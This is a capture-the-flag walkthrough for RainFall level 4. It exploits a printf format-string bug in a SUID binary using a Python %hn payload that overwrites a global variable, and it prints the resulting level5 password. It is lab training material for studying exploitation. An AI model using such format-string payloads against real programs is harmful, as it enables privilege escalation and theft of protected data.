# RainFall: Level4 Walkthrough

## Step 1: Overview

Connect to the RainFall server:

```bash
ssh level4@${RAINFALL_IP} -p 4242
```

List the binary:

```bash
level4@RainFall:~$ ls -l
-rwsr-s---+ 1 level5 users 7552 Aug 30  2022 level4
```

This binary is SUID-owned by `level5`. Our goal is to exploit a format string vulnerability to write the value `0x01025544` to the global variable `m`.

---

## Step 2: Source Code Summary

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int m = 0;

int print_input(char* input) {
    return printf(input);
}

int check_and_run() {
    char buffer[512];
    fgets(buffer, sizeof(buffer), stdin);
    print_input(buffer);

    int current_m = m;
    if (current_m != 16930116)  // 0x01025544
        return current_m;

    return system("/bin/cat /home/user/level5/.pass");
}

int main(int argc, char** argv, char** envp) {
    return check_and_run();
}
```

The vulnerability is the use of `printf(buffer)` which allows us to exploit format string behavior.

---

## Step 3: Finding the Address of `m`

Using GDB:

```bash
(gdb) info variables
...
0x08049810  m
```

So `m` is located at `0x08049810`. We will overwrite this 4-byte variable using two 2-byte writes.

Target value:

```c
0x01025544 = 16930116
```

Split into:

* Lower 16-bit: `0x5544` = 21828
* Upper 16-bit: `0x0102` = 258

---

## Step 4: Discover Stack Offset for Format String

Run to find our address placement in the stack:

```bash
(gdb) run <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
```

Analyze the output and determine the offset, assume `%12$hn` and `%13$hn` for our addresses.

---

## Step 5: Construct the Payload

```bash
first_padding = 21828 - 8 = 21820
second_padding = (258 - 21828) % 65536 = 43966
```

Craft the payload:

```bash
python -c 'print("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%21820c%12$hn" + "%43966c%13$hn")' > /tmp/level4.exploit
```

Explanation:

* `0x08049810` and `0x08049812` hold lower and upper halves
* `%12$hn` writes to 0x08049810 (lower)
* `%13$hn` writes to 0x08049812 (upper)

---

## Step 6: Execute the Exploit

```bash
(cat /tmp/level4.exploit; cat) | ./level4
```

This triggers `m == 0x01025544`, and prints the flag.

---

## Step 7: Retrieving the Flag

```bash
$ cat /home/user/level5/.pass
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

---

## Step 8: Move to Level05

```bash
level4@RainFall:~$ su level5
Password: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
